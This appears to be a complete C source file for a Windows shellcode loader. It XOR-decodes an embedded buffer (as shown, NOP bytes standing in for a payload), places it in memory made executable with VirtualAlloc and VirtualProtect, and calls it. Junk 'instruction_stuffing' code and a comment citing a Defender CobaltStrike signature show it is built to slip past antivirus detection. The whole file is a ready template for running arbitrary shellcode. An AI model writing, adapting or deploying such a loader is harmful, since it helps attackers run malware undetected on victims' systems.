#include <windows.h>
#include <stdio.h>


// Simple XOR will be detected as : 
//   https://defendersearch.r00ted.ch/threat?name=Trojan%3AWin64%2FCobaltStrike.JU%21MTB
void xor_cipher(char *ciphertext, size_t ciphertext_len, const char *key, size_t key_len) {
    int instruction_stuffing = 0;
    if (key_len == 0) return;  // prevent division by zero

    for (size_t i = 0; i < ciphertext_len; ++i) {
        instruction_stuffing += key_len * i;
        ciphertext[i] ^= key[i % key_len];
    }

    if (instruction_stuffing == 0) {
        printf("Nothing");
    }
}


int main(void)
{
	DWORD result;
	char shellcode[200] = {"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF\xC2\xDB\xD5\xC9"
"\xC8\xDF\xC2\xDB\xD5\xC9\xC8\xDF"};
	char xorkey[] = "XORKEY";


	// Allocate memory for the shellcode RW
    char *dest = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, PAGE_READWRITE);
	if (dest == NULL) {
		return 1;
	}

	// Copy the shellcode to the allocated memory
	memcpy(dest, shellcode, sizeof(shellcode));

	// Decode the shellcode
	xor_cipher((char *) dest, sizeof(shellcode), xorkey, strlen(xorkey));

	// Change memory protection to RX
	if (VirtualProtect(dest, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &result) == 0) {
		return 2;
	}

    // Execute *dest
    (*(void(*)())(dest))();
	
	return 0;
}
